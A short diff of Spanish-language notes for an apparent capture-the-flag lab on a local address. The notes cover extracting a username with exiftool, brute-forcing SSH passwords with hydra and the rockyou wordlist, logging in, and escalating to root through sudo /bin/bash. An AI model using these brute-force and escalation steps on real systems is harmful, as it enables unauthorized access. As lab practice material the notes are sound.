@@ -12,6 +12,6 @@ sudo exiftool imagen.jpeg
 encontramos el usuario
 sudo hydra -l borazuwarah -P /usr/share/wordlist/rockyou.txt.gz
 obtenemos la contraseña y entramos por ssh
-sudo ssh borazuwarah@172.17.0.2
+ssh borazuwarah@172.17.0.2
 sudo -l
 sudo /bin/bash
